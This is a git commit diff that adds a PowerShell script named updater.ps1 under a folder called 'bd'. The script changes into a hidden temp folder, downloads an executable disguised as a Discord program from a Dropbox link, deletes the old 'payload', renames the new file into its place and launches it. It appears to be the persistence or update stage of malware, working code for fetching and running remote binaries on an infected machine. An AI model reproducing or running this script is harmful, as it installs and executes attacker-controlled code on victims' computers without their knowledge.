4e7e9dd2ca6bceddca5d64918dc8ae92f7543fff
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 20:32:04 +0200

    updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -1,1 +1,14 @@
-awdawd
+#change directory
+cd $env:temp/sVBXKuz
+
+#download updated payload
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile new_wsappa.exe
+
+#remove old payload
+remove-item wsappa.exe
+
+#change name
+rename-item new_wsappa.exe wsappa.exe
+
+#start new payload
+Start-Process -FilePath "wsappa.exe"
